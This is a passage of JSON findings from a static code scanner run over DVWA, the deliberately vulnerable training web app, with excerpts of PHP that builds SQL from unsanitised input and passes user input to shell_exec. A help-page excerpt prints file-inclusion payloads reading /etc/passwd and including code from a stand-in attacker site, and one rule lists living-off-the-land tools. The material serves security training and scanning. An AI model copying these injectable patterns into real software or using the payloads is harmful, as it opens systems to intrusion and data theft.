        "excerpt": "\t$id = $_COOKIE[ &#39;id&#39; ];\n\n\t// Check database\n\t$getid  = &quot;SELECT first_name, last_name FROM users WHERE user_id = &#39;$id&#39; LIMIT 1;&quot;;\n\t$result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $getid ); // Removed &#39;or die&#39; to suppress mysql errors\n\n\t// Get results\n\t$num = @mysqli_num_rows( $result ); // The &#39;@&#39; character suppresses errors\n\tif( $num &gt; 0 ) {\n",
        "startLocationLine": 8,
        "startLocationColumn": 12,
        "endLocationLine": 8,
        "endLocationColumn": 86
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/sqli_blind/source/high.php",
        "ruleId": "AI011610",
        "ruleName": "Data: DBMS (SQL)",
        "ruleDescription": "Data: DBMS (SQL)",
        "pattern": "\\b(mysql)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "Data.DBMS.SQL"
        ],
        "sample": "mysql",
        "excerpt": "\n\t// Check database\n\t$getid  = &quot;SELECT first_name, last_name FROM users WHERE user_id = &#39;$id&#39; LIMIT 1;&quot;;\n\t$result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $getid ); // Removed &#39;or die&#39; to suppress mysql errors\n\n\t// Get results\n\t$num = @mysqli_num_rows( $result ); // The &#39;@&#39; character suppresses errors\n\tif( $num &gt; 0 ) {\n\t\t// Feedback for end user\n",
        "startLocationLine": 9,
        "startLocationColumn": 96,
        "endLocationLine": 9,
        "endLocationColumn": 101
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/sqli_blind/source/impossible.php",
        "ruleId": "AI011600",
        "ruleName": "Data: DBMS (SQL)",
        "ruleDescription": "Data: DBMS (SQL)",
        "pattern": "['\\\"](select|insert|delete|update)\\s.*",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "Data.DBMS.SQL"
        ],
        "sample": "&#39;SELECT first_name, last_name FROM users WHERE user_id = (:id) LIMIT 1;&#39; );",
        "excerpt": "\t// Was a number entered?\n\tif(is_numeric( $id )) {\n\t\t// Check the database\n\t\t$data = $db-&gt;prepare( &#39;SELECT first_name, last_name FROM users WHERE user_id = (:id) LIMIT 1;&#39; );\n\t\t$data-&gt;bindParam( &#39;:id&#39;, $id, PDO::PARAM_INT );\n\t\t$data-&gt;execute();\n\n\t\t// Get results\n\t\tif( $data-&gt;rowCount() == 1 ) {\n",
        "startLocationLine": 13,
        "startLocationColumn": 25,
        "endLocationLine": 13,
        "endLocationColumn": 101
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/sqli_blind/source/medium.php",
        "ruleId": "AI011600",
        "ruleName": "Data: DBMS (SQL)",
        "ruleDescription": "Data: DBMS (SQL)",
        "pattern": "['\\\"](select|insert|delete|update)\\s.*",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "Data.DBMS.SQL"
        ],
        "sample": "&quot;SELECT first_name, last_name FROM users WHERE user_id = $id;&quot;;",
        "excerpt": "\t$id = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $id ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));\n\n\t// Check database\n\t$getid  = &quot;SELECT first_name, last_name FROM users WHERE user_id = $id;&quot;;\n\t$result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $getid ); // Removed &#39;or die&#39; to suppress mysql errors\n\n\t// Get results\n\t$num = @mysqli_num_rows( $result ); // The &#39;@&#39; character suppresses errors\n\tif( $num &gt; 0 ) {\n",
        "startLocationLine": 9,
        "startLocationColumn": 12,
        "endLocationLine": 9,
        "endLocationColumn": 76
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/sqli_blind/source/medium.php",
        "ruleId": "AI011610",
        "ruleName": "Data: DBMS (SQL)",
        "ruleDescription": "Data: DBMS (SQL)",
        "pattern": "\\b(mysql)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "Data.DBMS.SQL"
        ],
        "sample": "mysql",
        "excerpt": "\n\t// Check database\n\t$getid  = &quot;SELECT first_name, last_name FROM users WHERE user_id = $id;&quot;;\n\t$result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $getid ); // Removed &#39;or die&#39; to suppress mysql errors\n\n\t// Get results\n\t$num = @mysqli_num_rows( $result ); // The &#39;@&#39; character suppresses errors\n\tif( $num &gt; 0 ) {\n\t\t// Feedback for end user\n",
        "startLocationLine": 10,
        "startLocationColumn": 96,
        "endLocationLine": 10,
        "endLocationColumn": 101
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/sqli_blind/source/low.php",
        "ruleId": "AI011600",
        "ruleName": "Data: DBMS (SQL)",
        "ruleDescription": "Data: DBMS (SQL)",
        "pattern": "['\\\"](select|insert|delete|update)\\s.*",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "Data.DBMS.SQL"
        ],
        "sample": "&quot;SELECT first_name, last_name FROM users WHERE user_id = &#39;$id&#39;;&quot;;",
        "excerpt": "\t$id = $_GET[ &#39;id&#39; ];\n\n\t// Check database\n\t$getid  = &quot;SELECT first_name, last_name FROM users WHERE user_id = &#39;$id&#39;;&quot;;\n\t$result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $getid ); // Removed &#39;or die&#39; to suppress mysql errors\n\n\t// Get results\n\t$num = @mysqli_num_rows( $result ); // The &#39;@&#39; character suppresses errors\n\tif( $num &gt; 0 ) {\n",
        "startLocationLine": 8,
        "startLocationColumn": 12,
        "endLocationLine": 8,
        "endLocationColumn": 78
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/sqli_blind/source/low.php",
        "ruleId": "AI011610",
        "ruleName": "Data: DBMS (SQL)",
        "ruleDescription": "Data: DBMS (SQL)",
        "pattern": "\\b(mysql)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "Data.DBMS.SQL"
        ],
        "sample": "mysql",
        "excerpt": "\n\t// Check database\n\t$getid  = &quot;SELECT first_name, last_name FROM users WHERE user_id = &#39;$id&#39;;&quot;;\n\t$result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $getid ); // Removed &#39;or die&#39; to suppress mysql errors\n\n\t// Get results\n\t$num = @mysqli_num_rows( $result ); // The &#39;@&#39; character suppresses errors\n\tif( $num &gt; 0 ) {\n\t\t// Feedback for end user\n",
        "startLocationLine": 9,
        "startLocationColumn": 96,
        "endLocationLine": 9,
        "endLocationColumn": 101
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/fi/help/help.php",
        "ruleId": "AI026500",
        "ruleName": "Dependency: Included Source",
        "ruleDescription": "Dependency: Included Source",
        "pattern": "(include|require) .*",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "Dependency.SourceInclude"
        ],
        "sample": "include",
        "excerpt": "\t\t&lt;br /&gt;&lt;hr /&gt;&lt;br /&gt;\n\n\t\t&lt;h3&gt;Low Level&lt;/h3&gt;\n\t\t&lt;p&gt;This allows for direct input into &lt;u&gt;one of many PHP functions&lt;/u&gt; that will include the content when executing.&lt;/p&gt;\n\n\t\t&lt;p&gt;Depending on the web service configuration will depend if RFI is a possibility.&lt;/p&gt;\n\t\t&lt;pre&gt;Spoiler: &lt;span class=&quot;spoiler&quot;&gt;LFI: ?page=../../../../../../etc/passwd&lt;/span&gt;.\n\t\t\tSpoiler: &lt;span class=&quot;spoiler&quot;&gt;RFI: ?page=http://www.evilsite.com/evil.php&lt;/span&gt;.&lt;/pre&gt;\n\n",
        "startLocationLine": 28,
        "startLocationColumn": 83,
        "endLocationLine": 28,
        "endLocationColumn": 123
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/fi/help/help.php",
        "ruleId": "AI026500",
        "ruleName": "Dependency: Included Source",
        "ruleDescription": "Dependency: Included Source",
        "pattern": "(include|require) .*",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "Dependency.SourceInclude"
        ],
        "sample": "include",
        "excerpt": "\n\t\t&lt;h3&gt;High Level&lt;/h3&gt;\n\t\t&lt;p&gt;The developer has had enough. They decided to only allow certain files to be used. However as there are multiple files with the same basename,\n\t\t\tthey use a wildcard to include them all.&lt;/p&gt;\n\t\t&lt;pre&gt;Spoiler: &lt;span class=&quot;spoiler&quot;&gt;LFI: The filename only has start with a certain value.&lt;/span&gt;.\n\t\t\tSpoiler: &lt;span class=&quot;spoiler&quot;&gt;RFI: Need to link in another vulnerability, such as file upload&lt;/span&gt;.&lt;/pre&gt;\n\n\t\t&lt;br /&gt;\n\n",
        "startLocationLine": 45,
        "startLocationColumn": 27,
        "endLocationLine": 45,
        "endLocationColumn": 49
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/fi/help/help.php",
        "ruleId": "AI027500",
        "ruleName": "Hygiene: Suspicious Comment",
        "ruleDescription": "Hygiene: Suspicious Comment",
        "pattern": "hack|insecure|black magic|high risk|risky|riskiest|obfuscation|obfuscate|obfuscated",
        "type": "Regex",
        "confidence": "Medium",
        "severity": "Moderate",
        "tags": [
          "Miscellaneous.CodeHygiene.Comment.Suspicious"
        ],
        "sample": "hack",
        "excerpt": "\t\t&lt;br /&gt;&lt;hr /&gt;&lt;br /&gt;\n\n\t\t&lt;h3&gt;Objective&lt;/h3&gt;\n\t\t&lt;p&gt;Read all &lt;u&gt;five&lt;/u&gt; famous quotes from &#39;&lt;a href=&quot;../hackable/flags/fi.php&quot;&gt;../hackable/flags/fi.php&lt;/a&gt;&#39; using only the file inclusion.&lt;/p&gt;\n\n\t\t&lt;br /&gt;&lt;hr /&gt;&lt;br /&gt;\n\n\t\t&lt;h3&gt;Low Level&lt;/h3&gt;\n\t\t&lt;p&gt;This allows for direct input into &lt;u&gt;one of many PHP functions&lt;/u&gt; that will include the content when executing.&lt;/p&gt;\n",
        "startLocationLine": 23,
        "startLocationColumn": 59,
        "endLocationLine": 23,
        "endLocationColumn": 63
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/fi/help/help.php",
        "ruleId": "AI027500",
        "ruleName": "Hygiene: Suspicious Comment",
        "ruleDescription": "Hygiene: Suspicious Comment",
        "pattern": "hack|insecure|black magic|high risk|risky|riskiest|obfuscation|obfuscate|obfuscated",
        "type": "Regex",
        "confidence": "Medium",
        "severity": "Moderate",
        "tags": [
          "Miscellaneous.CodeHygiene.Comment.Suspicious"
        ],
        "sample": "hack",
        "excerpt": "\t\t&lt;br /&gt;&lt;hr /&gt;&lt;br /&gt;\n\n\t\t&lt;h3&gt;Objective&lt;/h3&gt;\n\t\t&lt;p&gt;Read all &lt;u&gt;five&lt;/u&gt; famous quotes from &#39;&lt;a href=&quot;../hackable/flags/fi.php&quot;&gt;../hackable/flags/fi.php&lt;/a&gt;&#39; using only the file inclusion.&lt;/p&gt;\n\n\t\t&lt;br /&gt;&lt;hr /&gt;&lt;br /&gt;\n\n\t\t&lt;h3&gt;Low Level&lt;/h3&gt;\n\t\t&lt;p&gt;This allows for direct input into &lt;u&gt;one of many PHP functions&lt;/u&gt; that will include the content when executing.&lt;/p&gt;\n",
        "startLocationLine": 23,
        "startLocationColumn": 85,
        "endLocationLine": 23,
        "endLocationColumn": 89
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/exec/help/help.php",
        "ruleId": "AI040600",
        "ruleName": "Authorization: General",
        "ruleDescription": "Authorization: General",
        "pattern": "authorize|authorized|authorization|isauthorized",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Authorization.General"
        ],
        "sample": "authorize",
        "excerpt": "\t\t&lt;h3&gt;About&lt;/h3&gt;\n\t\t&lt;p&gt;The purpose of the command injection attack is to inject and execute commands specified by the attacker in the vulnerable application.\n\t\t\tIn situation like this, the application, which executes unwanted system commands, is like a pseudo system shell, and the attacker may use it\n\t\t\tas any authorized system user. However, commands are executed with the same privileges and environment as the web service has.&lt;/p&gt;\n\n\t\t&lt;p&gt;Command injection attacks are possible in most cases because of lack of correct input data validation, which can be manipulated by the attacker\n\t\t\t(forms, cookies, HTTP headers etc.).&lt;/p&gt;\n\n\t\t&lt;p&gt;The syntax and commands may differ between the Operating Systems (OS), such as Linux and Windows, depending on their desired actions.&lt;/p&gt;\n",
        "startLocationLine": 11,
        "startLocationColumn": 11,
        "endLocationLine": 11,
        "endLocationColumn": 20
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/exec/source/high.php",
        "ruleId": "DH000002",
        "ruleName": "Functions: Execute",
        "ruleDescription": "Function: Execute",
        "pattern": "\\b(shell_exec)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Functions.execute"
        ],
        "sample": "shell_exec",
        "excerpt": "\t// Determine OS and execute the ping command.\n\tif( stristr( php_uname( &#39;s&#39; ), &#39;Windows NT&#39; ) ) {\n\t\t// Windows\n\t\t$cmd = shell_exec( &#39;ping  &#39; . $target );\n\t}\n\telse {\n\t\t// *nix\n\t\t$cmd = shell_exec( &#39;ping  -c 4 &#39; . $target );\n\t}\n",
        "startLocationLine": 26,
        "startLocationColumn": 10,
        "endLocationLine": 26,
        "endLocationColumn": 20
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/exec/source/high.php",
        "ruleId": "DH000002",
        "ruleName": "Functions: Execute",
        "ruleDescription": "Function: Execute",
        "pattern": "\\b(shell_exec)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Functions.execute"
        ],
        "sample": "shell_exec",
        "excerpt": "\t}\n\telse {\n\t\t// *nix\n\t\t$cmd = shell_exec( &#39;ping  -c 4 &#39; . $target );\n\t}\n\n\t// Feedback for the end user\n\t$html .= &quot;&lt;pre&gt;{$cmd}&lt;/pre&gt;&quot;;\n}\n",
        "startLocationLine": 30,
        "startLocationColumn": 10,
        "endLocationLine": 30,
        "endLocationColumn": 20
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/exec/source/high.php",
        "ruleId": "AI035510",
        "ruleName": "OS: Dynamic Execution",
        "ruleDescription": "OS: Dynamic Execution",
        "pattern": "\\b(powershell|cmd|rundll32|regedit|wscript|javaw|csc|regsvr32|certutil|bitsadmin|schtasks|wmic|eqnedt32|msiexec|cmstp|mshta|curl|installutil|regsvcs|regasm|msbuild|cscript|msxsl|runonce)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "OS.Process.DynamicExecution"
        ],
        "sample": "cmd",
        "excerpt": "\t// Determine OS and execute the ping command.\n\tif( stristr( php_uname( &#39;s&#39; ), &#39;Windows NT&#39; ) ) {\n\t\t// Windows\n\t\t$cmd = shell_exec( &#39;ping  &#39; . $target );\n\t}\n\telse {\n\t\t// *nix\n\t\t$cmd = shell_exec( &#39;ping  -c 4 &#39; . $target );\n\t}\n",
        "startLocationLine": 26,
        "startLocationColumn": 4,
        "endLocationLine": 26,
        "endLocationColumn": 7
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/exec/source/high.php",
        "ruleId": "AI035510",
        "ruleName": "OS: Dynamic Execution",
        "ruleDescription": "OS: Dynamic Execution",
        "pattern": "\\b(powershell|cmd|rundll32|regedit|wscript|javaw|csc|regsvr32|certutil|bitsadmin|schtasks|wmic|eqnedt32|msiexec|cmstp|mshta|curl|installutil|regsvcs|regasm|msbuild|cscript|msxsl|runonce)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "OS.Process.DynamicExecution"
        ],
        "sample": "cmd",
        "excerpt": "\t}\n\telse {\n\t\t// *nix\n\t\t$cmd = shell_exec( &#39;ping  -c 4 &#39; . $target );\n\t}\n\n\t// Feedback for the end user\n\t$html .= &quot;&lt;pre&gt;{$cmd}&lt;/pre&gt;&quot;;\n}\n",
        "startLocationLine": 30,
        "startLocationColumn": 4,
        "endLocationLine": 30,
        "endLocationColumn": 7
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/exec/source/high.php",
        "ruleId": "AI035510",
        "ruleName": "OS: Dynamic Execution",
        "ruleDescription": "OS: Dynamic Execution",
        "pattern": "\\b(powershell|cmd|rundll32|regedit|wscript|javaw|csc|regsvr32|certutil|bitsadmin|schtasks|wmic|eqnedt32|msiexec|cmstp|mshta|curl|installutil|regsvcs|regasm|msbuild|cscript|msxsl|runonce)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "OS.Process.DynamicExecution"
        ],
        "sample": "cmd",
        "excerpt": "\t}\n\n\t// Feedback for the end user\n\t$html .= &quot;&lt;pre&gt;{$cmd}&lt;/pre&gt;&quot;;\n}\n\n?&gt;\n\n",
        "startLocationLine": 34,
        "startLocationColumn": 19,
        "endLocationLine": 34,
        "endLocationColumn": 22
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/exec/source/impossible.php",
        "ruleId": "DH000002",
        "ruleName": "Functions: Execute",
        "ruleDescription": "Function: Execute",
        "pattern": "\\b(shell_exec)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Functions.execute"
        ],
        "sample": "shell_exec",
        "excerpt": "\t\t// Determine OS and execute the ping command.\n\t\tif( stristr( php_uname( &#39;s&#39; ), &#39;Windows NT&#39; ) ) {\n\t\t\t// Windows\n\t\t\t$cmd = shell_exec( &#39;ping  &#39; . $target );\n\t\t}\n\t\telse {\n\t\t\t// *nix\n\t\t\t$cmd = shell_exec( &#39;ping  -c 4 &#39; . $target );\n\t\t}\n",
        "startLocationLine": 22,
        "startLocationColumn": 11,
        "endLocationLine": 22,
        "endLocationColumn": 21
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/exec/source/impossible.php",
        "ruleId": "DH000002",
        "ruleName": "Functions: Execute",
        "ruleDescription": "Function: Execute",
        "pattern": "\\b(shell_exec)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Functions.execute"
        ],
        "sample": "shell_exec",
        "excerpt": "\t\t}\n\t\telse {\n\t\t\t// *nix\n\t\t\t$cmd = shell_exec( &#39;ping  -c 4 &#39; . $target );\n\t\t}\n\n\t\t// Feedback for the end user\n\t\t$html .= &quot;&lt;pre&gt;{$cmd}&lt;/pre&gt;&quot;;\n\t}\n",
        "startLocationLine": 26,
        "startLocationColumn": 11,
        "endLocationLine": 26,
        "endLocationColumn": 21
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/exec/source/impossible.php",
        "ruleId": "AI035510",
        "ruleName": "OS: Dynamic Execution",
        "ruleDescription": "OS: Dynamic Execution",
        "pattern": "\\b(powershell|cmd|rundll32|regedit|wscript|javaw|csc|regsvr32|certutil|bitsadmin|schtasks|wmic|eqnedt32|msiexec|cmstp|mshta|curl|installutil|regsvcs|regasm|msbuild|cscript|msxsl|runonce)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "OS.Process.DynamicExecution"
        ],
        "sample": "cmd",
        "excerpt": "\t\t// Determine OS and execute the ping command.\n\t\tif( stristr( php_uname( &#39;s&#39; ), &#39;Windows NT&#39; ) ) {\n\t\t\t// Windows\n\t\t\t$cmd = shell_exec( &#39;ping  &#39; . $target );\n\t\t}\n\t\telse {\n\t\t\t// *nix\n\t\t\t$cmd = shell_exec( &#39;ping  -c 4 &#39; . $target );\n\t\t}\n",
        "startLocationLine": 22,
        "startLocationColumn": 5,
        "endLocationLine": 22,
        "endLocationColumn": 8
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/exec/source/impossible.php",
        "ruleId": "AI035510",
        "ruleName": "OS: Dynamic Execution",
        "ruleDescription": "OS: Dynamic Execution",
        "pattern": "\\b(powershell|cmd|rundll32|regedit|wscript|javaw|csc|regsvr32|certutil|bitsadmin|schtasks|wmic|eqnedt32|msiexec|cmstp|mshta|curl|installutil|regsvcs|regasm|msbuild|cscript|msxsl|runonce)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "OS.Process.DynamicExecution"
        ],
        "sample": "cmd",
        "excerpt": "\t\t}\n\t\telse {\n\t\t\t// *nix\n\t\t\t$cmd = shell_exec( &#39;ping  -c 4 &#39; . $target );\n\t\t}\n\n\t\t// Feedback for the end user\n\t\t$html .= &quot;&lt;pre&gt;{$cmd}&lt;/pre&gt;&quot;;\n\t}\n",
        "startLocationLine": 26,
        "startLocationColumn": 5,
        "endLocationLine": 26,
        "endLocationColumn": 8
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/exec/source/impossible.php",
        "ruleId": "AI035510",
        "ruleName": "OS: Dynamic Execution",
        "ruleDescription": "OS: Dynamic Execution",
        "pattern": "\\b(powershell|cmd|rundll32|regedit|wscript|javaw|csc|regsvr32|certutil|bitsadmin|schtasks|wmic|eqnedt32|msiexec|cmstp|mshta|curl|installutil|regsvcs|regasm|msbuild|cscript|msxsl|runonce)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "OS.Process.DynamicExecution"
        ],
        "sample": "cmd",
        "excerpt": "\t\t}\n\n\t\t// Feedback for the end user\n\t\t$html .= &quot;&lt;pre&gt;{$cmd}&lt;/pre&gt;&quot;;\n\t}\n\telse {\n\t\t// Ops. Let the user name theres a mistake\n\t\t$html .= &#39;&lt;pre&gt;ERROR: You have entered an invalid IP.&lt;/pre&gt;&#39;;\n\t}\n",
        "startLocationLine": 30,
        "startLocationColumn": 20,
        "endLocationLine": 30,
        "endLocationColumn": 23
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/exec/source/medium.php",
        "ruleId": "DH000002",
        "ruleName": "Functions: Execute",
        "ruleDescription": "Function: Execute",
        "pattern": "\\b(shell_exec)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Functions.execute"
        ],
        "sample": "shell_exec",
        "excerpt": "\t// Determine OS and execute the ping command.\n\tif( stristr( php_uname( &#39;s&#39; ), &#39;Windows NT&#39; ) ) {\n\t\t// Windows\n\t\t$cmd = shell_exec( &#39;ping  &#39; . $target );\n\t}\n\telse {\n\t\t// *nix\n\t\t$cmd = shell_exec( &#39;ping  -c 4 &#39; . $target );\n\t}\n",
        "startLocationLine": 19,
        "startLocationColumn": 10,
        "endLocationLine": 19,
        "endLocationColumn": 20
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/exec/source/medium.php",
        "ruleId": "DH000002",
        "ruleName": "Functions: Execute",
        "ruleDescription": "Function: Execute",
        "pattern": "\\b(shell_exec)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Functions.execute"
        ],
        "sample": "shell_exec",
        "excerpt": "\t}\n\telse {\n\t\t// *nix\n\t\t$cmd = shell_exec( &#39;ping  -c 4 &#39; . $target );\n\t}\n\n\t// Feedback for the end user\n\t$html .= &quot;&lt;pre&gt;{$cmd}&lt;/pre&gt;&quot;;\n}\n",
        "startLocationLine": 23,
        "startLocationColumn": 10,
        "endLocationLine": 23,
        "endLocationColumn": 20
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/exec/source/medium.php",
        "ruleId": "AI035510",
        "ruleName": "OS: Dynamic Execution",
        "ruleDescription": "OS: Dynamic Execution",
        "pattern": "\\b(powershell|cmd|rundll32|regedit|wscript|javaw|csc|regsvr32|certutil|bitsadmin|schtasks|wmic|eqnedt32|msiexec|cmstp|mshta|curl|installutil|regsvcs|regasm|msbuild|cscript|msxsl|runonce)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "OS.Process.DynamicExecution"
        ],
        "sample": "cmd",
        "excerpt": "\t// Determine OS and execute the ping command.\n\tif( stristr( php_uname( &#39;s&#39; ), &#39;Windows NT&#39; ) ) {\n\t\t// Windows\n\t\t$cmd = shell_exec( &#39;ping  &#39; . $target );\n\t}\n\telse {\n\t\t// *nix\n\t\t$cmd = shell_exec( &#39;ping  -c 4 &#39; . $target );\n\t}\n",
        "startLocationLine": 19,
        "startLocationColumn": 4,
        "endLocationLine": 19,
        "endLocationColumn": 7
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/exec/source/medium.php",
        "ruleId": "AI035510",
        "ruleName": "OS: Dynamic Execution",
        "ruleDescription": "OS: Dynamic Execution",
        "pattern": "\\b(powershell|cmd|rundll32|regedit|wscript|javaw|csc|regsvr32|certutil|bitsadmin|schtasks|wmic|eqnedt32|msiexec|cmstp|mshta|curl|installutil|regsvcs|regasm|msbuild|cscript|msxsl|runonce)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "OS.Process.DynamicExecution"
        ],
        "sample": "cmd",
        "excerpt": "\t}\n\telse {\n\t\t// *nix\n\t\t$cmd = shell_exec( &#39;ping  -c 4 &#39; . $target );\n\t}\n\n\t// Feedback for the end user\n\t$html .= &quot;&lt;pre&gt;{$cmd}&lt;/pre&gt;&quot;;\n}\n",
        "startLocationLine": 23,
        "startLocationColumn": 4,
        "endLocationLine": 23,
        "endLocationColumn": 7
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/exec/source/medium.php",
        "ruleId": "AI035510",
        "ruleName": "OS: Dynamic Execution",
        "ruleDescription": "OS: Dynamic Execution",
        "pattern": "\\b(powershell|cmd|rundll32|regedit|wscript|javaw|csc|regsvr32|certutil|bitsadmin|schtasks|wmic|eqnedt32|msiexec|cmstp|mshta|curl|installutil|regsvcs|regasm|msbuild|cscript|msxsl|runonce)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "OS.Process.DynamicExecution"
        ],
        "sample": "cmd",
        "excerpt": "\t}\n\n\t// Feedback for the end user\n\t$html .= &quot;&lt;pre&gt;{$cmd}&lt;/pre&gt;&quot;;\n}\n\n?&gt;\n\n",
        "startLocationLine": 27,
        "startLocationColumn": 19,
        "endLocationLine": 27,
        "endLocationColumn": 22
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/exec/source/low.php",
        "ruleId": "DH000002",
        "ruleName": "Functions: Execute",
        "ruleDescription": "Function: Execute",
        "pattern": "\\b(shell_exec)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Functions.execute"
        ],
        "sample": "shell_exec",
        "excerpt": "\t// Determine OS and execute the ping command.\n\tif( stristr( php_uname( &#39;s&#39; ), &#39;Windows NT&#39; ) ) {\n\t\t// Windows\n\t\t$cmd = shell_exec( &#39;ping  &#39; . $target );\n\t}\n\telse {\n\t\t// *nix\n\t\t$cmd = shell_exec( &#39;ping  -c 4 &#39; . $target );\n\t}\n",
        "startLocationLine": 10,
        "startLocationColumn": 10,
        "endLocationLine": 10,
        "endLocationColumn": 20
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/exec/source/low.php",
        "ruleId": "DH000002",
